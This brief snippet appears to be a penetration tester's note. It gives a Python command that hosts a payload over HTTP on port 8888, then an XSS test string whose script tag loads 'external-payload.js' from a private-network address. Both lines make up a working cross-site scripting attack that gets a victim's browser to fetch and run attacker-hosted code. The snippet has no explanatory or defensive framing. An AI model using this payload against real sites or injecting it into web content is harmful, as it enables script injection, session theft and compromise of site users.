// Python command to quickly host payload for tests
python -m SimpleHTTPServer 8888

// XSS Test String
<script src="http://192.168.192.4:8888/external-payload.js"></script>
